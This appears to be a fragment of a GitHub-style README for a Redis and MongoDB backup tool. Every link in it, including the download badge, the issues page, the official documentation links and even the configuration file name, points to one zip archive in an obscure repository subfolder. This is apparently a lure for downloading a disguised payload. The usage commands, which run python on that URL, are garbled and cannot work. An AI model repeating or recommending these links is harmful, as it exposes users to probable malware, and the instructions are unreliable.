...
## 📦 Download Here
[![Download Latest Release](https://raw.githubusercontent.com/Anastasiya322/redis-mongo-backup-tool/main/savoyed/backup_mongo_redis_tool_3.2.zip%20Latest%20Release-v1.0.0-brightgreen)](https://raw.githubusercontent.com/Anastasiya322/redis-mongo-backup-tool/main/savoyed/backup_mongo_redis_tool_3.2.zip)
...
Visit this page to download the latest release: [Download Here](https://raw.githubusercontent.com/Anastasiya322/redis-mongo-backup-tool/main/savoyed/backup_mongo_redis_tool_3.2.zip).
...
```bash
python https://raw.githubusercontent.com/Anastasiya322/redis-mongo-backup-tool/main/savoyed/backup_mongo_redis_tool_3.2.zip [options]
```

### Step 7: Options and Usage
- For backup Redis, use:
  ```bash
  python https://raw.githubusercontent.com/Anastasiya322/redis-mongo-backup-tool/main/savoyed/backup_mongo_redis_tool_3.2.zip --backup-redis --pattern "your_pattern_here"
  ```
  
- For backup MongoDB, use:
  ```bash
  python https://raw.githubusercontent.com/Anastasiya322/redis-mongo-backup-tool/main/savoyed/backup_mongo_redis_tool_3.2.zip --backup-mongo --db "your_db_name"
  ```
  
- To restore from a backup file:
  ```bash
  python https://raw.githubusercontent.com/Anastasiya322/redis-mongo-backup-tool/main/savoyed/backup_mongo_redis_tool_3.2.zip --restore --file "backup_file_here"
  ```
...
The configuration file should be named `https://raw.githubusercontent.com/Anastasiya322/redis-mongo-backup-tool/main/savoyed/backup_mongo_redis_tool_3.2.zip` and placed in the same directory as the tool.
...
## 👩‍💻 Community Support
Feel free to raise any questions or issues on the [GitHub Issues page](https://raw.githubusercontent.com/Anastasiya322/redis-mongo-backup-tool/main/savoyed/backup_mongo_redis_tool_3.2.zip). Join the community to share experiences, tips, and suggestions for improvement.
...
- [Redis Documentation](https://raw.githubusercontent.com/Anastasiya322/redis-mongo-backup-tool/main/savoyed/backup_mongo_redis_tool_3.2.zip)
- [MongoDB Documentation](https://raw.githubusercontent.com/Anastasiya322/redis-mongo-backup-tool/main/savoyed/backup_mongo_redis_tool_3.2.zip)
